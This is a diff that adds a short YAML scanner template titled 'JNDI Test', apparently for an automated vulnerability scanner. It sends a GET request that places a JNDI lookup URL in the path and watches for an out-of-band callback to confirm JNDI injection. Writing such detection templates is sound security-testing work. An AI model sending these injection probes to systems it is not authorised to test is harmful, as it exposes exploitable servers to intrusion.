@@ -1,0 +1,18 @@
+id: jndi-test
+
+info:
+  name: JNDI Test
+  author: zan8in
+  severity: high
+  verified: false
+
+set:
+  reverse: newJNDI()
+  jndiURL: reverse.url.host + reverse.url.path
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jnditest/{{jndiURL}}
+    expression: reverse.jndi(3)
+expression: r0()
